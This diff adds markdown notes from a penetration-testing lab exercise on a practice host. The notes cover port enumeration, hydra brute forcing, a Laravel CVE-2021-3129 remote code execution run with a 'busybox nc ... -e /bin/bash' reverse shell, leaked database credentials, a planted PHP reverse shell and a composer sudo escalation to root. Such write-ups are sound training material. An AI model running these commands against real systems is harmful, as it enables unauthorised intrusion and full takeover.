@@ -1,0 +1,146 @@
+### Enumeration
+```
+IP=192.168.170.38
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p22,80 -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 22
+	- OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+- 80
+	- Apache httpd 2.4.56 ((Debian))
+### Foothold
+- 21
+	- ftp anonymous@$IP
+	- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP
+- RPC/ SMB
+	- enum4linux $IP
+- 445
+	- smbclient -N -L //$IP
+	- nmap --script smb-vuln* -p135,139,445 $IP
+- SQL
+	- Mysql
+		- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/mysql-betterdefaultpasslist.txt mysql://$IP
+	- Postgres
+		- `hydra -C /usr/share/seclists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$IP
+- 80
+	- Default landing page
+		- ![[Pasted image 20240814095853.png]]
+		- ![[Pasted image 20240814095924.png]]
+			- Sign up buttons do nothing
+			- Contact box
+				- Redirects to: http://192.168.170.38/action_page.php?Name=abc&Email=abc%40abc.com&Message=hehe&Like=on
+				- Gives us version number
+	- Team
+		- Johnny Skunk
+		- Rebecca Flex
+		- Jan Ringo
+		- Kai Ringo
+		- Paul McCartney
+		- Maynard James Kenna
+		- Deborah Anne Dyer OBE
+	- Versions
+		- Laravel 8.4.0
+			- Laravel 8.4.2 debug mode - Remote code execution
+			- python3 CVE-2021-3129.py
+				- ![[Pasted image 20240814104002.png]]
+			- python3 CVE-2021-3129.py --exec 'busybox nc 192.168.45.163 21 -e /bin/bash'
+				- Leads to RCE
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- /register
+				- Let me register as new user
+			- /login
+			- /web.config
+				- white page
+			- /robots.txt
+				- nothing
+			- /images
+				- forbidden
+			- /javascript
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+	- Vulnerability scan
+		- nikto -h http://$IP
+	- Logged in
+		- ![[Pasted image 20240814100410.png]]
+			- Turned debug on
+		- dirsearch -u http://$IP/home
+### PE
+#### Linux
+- www-data
+	- id
+		- uid=33(www-data) gid=33(www-data) groups=33(www-data)
+	- sudo -l
+		- needs password
+	- uname -a
+		- `Linux debian 5.10.0-25-amd64 #1 SMP Debian 5.10.191-1 (2023-08-16) x86_64 GNU/Linux
+	- getcap -r / 2>/dev/null
+		- ping
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- Users with console
+		- skunk
+	- netstat -ano
+		- Active ports
+			- nothing new
+	- Directories to check
+		- /opt
+			- Check GTFO Bins. Treated as SUID
+			- empty
+	- linpeas
+		- Possible Exploits
+			- idrty pipe
+		- Interesting Files
+			- /var/www/html/lavita/config/database.php
+				- user forge  db forge
+			- /var/www/html/lavita/.env
+				- DB user: lavita
+				- DB pass: sdfquelw0kly9jgbx92
+	- sql
+		- mysql -u lavita -p
+			- sdfquelw0kly9jgbx92
+			- DBs
+				- information_schema
+				- lavita
+					- users
+						- only my user
+					- password_resets
+						- nothing
+	- pspy64
+		- ![[Pasted image 20240814111222.png]]
+	- User has write over /var/www/html/lavita
+		- artisan is a php file
+		- Used php rev and editted the IP and port
+		- Moved to target and named it artisan
+		- Received shell as skunk
+		- ![[Pasted image 20240814112537.png]]
+		- ![[Pasted image 20240814112544.png]]
+- skunk
+	- id
+		- uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
+	- sudo -l
+		- ALL
+		- `(root) NOPASSWD: /usr/bin/composer --working-dir\=/var/www/html/lavita *
+			- GTFO bins
+				- cd /var/www/html/lavita
+				- `echo '{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}' > composer.json
+				- sudo /usr/bin/composer --working-dir\=/var/www/html/lavita x
+					- This only runs x for some reason 
+					- Gives us root
+		- sudo su
+			- needs password
+	- getcap -r / 2>/dev/null
+		- nothing
+	- suid
+		- find / -type f -perm -04000 -ls 2>/dev/null
+			- nothing
+	- linpeas
+		- nothing new
+	- pspy64
+### Credentials
+### Lessons Learned
